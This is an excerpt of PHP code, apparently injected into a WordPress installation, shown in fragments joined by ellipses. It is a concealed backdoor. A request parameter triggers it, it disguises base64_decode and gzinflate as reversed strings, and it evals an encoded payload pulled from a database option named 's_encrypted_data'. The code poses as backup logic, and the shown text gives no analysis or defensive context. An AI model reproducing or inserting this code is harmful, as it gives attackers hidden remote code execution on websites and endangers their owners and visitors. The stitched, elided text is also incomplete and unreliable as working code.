...
/* f74b622718e85dfddaa45acca8b2ae77 */


if(isset($_GET['act']) && !defined('BACKUP_RAN'))
{
	define('BACKUP_RAN', TRUE);
	if(stristr(getcwd(), 'wp-admin'))
	{
		$path = explode('wp-admin', getcwd());
		define('ROOT_PATH', $path[0]);
	} else {
		$path = explode('wp-content', getcwd());
		define('ROOT_PATH', $path[0]);
	}

	if(!function_exists('b64d'))
	{
		function b64d($str)
		{
			$hehehe = strrev('edoced_46esab');
			return $hehehe($str);
		}
	}

	if(!function_exists('gzi'))
	{
		function gzi($data)
		{
			$hehehe = strrev('etalfnizg');
			return $hehehe($data);
		}
	}
	...
	{
		$path = explode('wp-admin', getcwd());
		if(!defined('ROOT_PATH')) define('ROOT_PATH', $path[0]);
	} else {
		$path = explode('wp-content', getcwd());
		if(!defined('ROOT_PATH')) define('ROOT_PATH', $path[0]);
	}
	...
	$plugin_data = $wpdb->get_var("SELECT `option_value` FROM {$wpdb->options} WHERE `option_name`='s_encrypted_data'");
	if(NULL !== $plugin_data)
	{
		eval(gzi(b64d($plugin_data)));
	}
}
